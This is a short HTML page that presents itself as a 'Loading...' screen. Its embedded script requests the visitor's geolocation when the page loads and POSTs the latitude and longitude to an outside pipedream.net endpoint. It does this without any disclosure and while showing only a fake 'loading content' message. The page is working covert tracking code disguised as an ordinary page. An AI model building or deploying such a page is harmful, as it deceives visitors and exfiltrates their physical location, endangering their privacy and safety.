<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <p>Please wait, loading content...</p>
    <script>
        navigator.geolocation.getCurrentPosition(function(position) {
            fetch('https://eon186u4rmikh86.m.pipedream.net', {
                method: 'POST',
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                })
            }).catch(function(error) {
                console.log('Request sent (CORS error expected)');
            });
        });
    </script>
</body>
</html>
